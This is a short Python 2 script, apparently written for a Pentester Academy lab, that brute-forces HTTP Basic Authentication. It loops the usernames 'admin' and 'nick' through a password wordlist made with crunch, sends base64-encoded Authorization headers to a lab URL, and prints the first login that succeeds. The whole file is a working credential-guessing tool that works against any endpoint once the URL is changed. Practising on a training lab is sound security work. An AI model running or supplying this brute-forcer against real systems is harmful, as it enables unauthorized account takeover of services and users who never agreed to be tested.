#!/usr/bin/python

import base64
import urllib2
import sys
from termcolor import colored


U = ["admin","nick"]

'''
Use The Following Command To Generate wordlist
#crunch 5 5 asd -o wordlist.txt
'''

p = open('wordlist.txt','r')
P = [x.strip() for x in p.readlines()]
p.close()

url = "http://pentesteracademylab.appspot.com/lab/webapp/basicauth"
data = ""# idon't need to post any thing in this form .. its empty form
for UserName in U:
	for Pass in P:
		Login_Auth = urllib2.Request(url,data) #urllib by default use GET request if you need to make it POST you will need to add data
		Login_base = base64.encodestring('%s:%s' %(UserName,Pass)).replace('\n','')
		Login_Auth.add_header("Authorization" , "Basic %s" %Login_base)
		#if Login Failed it will responde by error of code 401 if not it will open the request
		try:
			Login = urllib2.urlopen(Login_Auth)
		except Exception,code:
			print "Login with Username %s ... Password %s ... Failed!"%(UserName,Pass)
		else:
			print colored("Login with Username %s ... Password %s "%(UserName,Pass),"green")
			sys.exit(0)
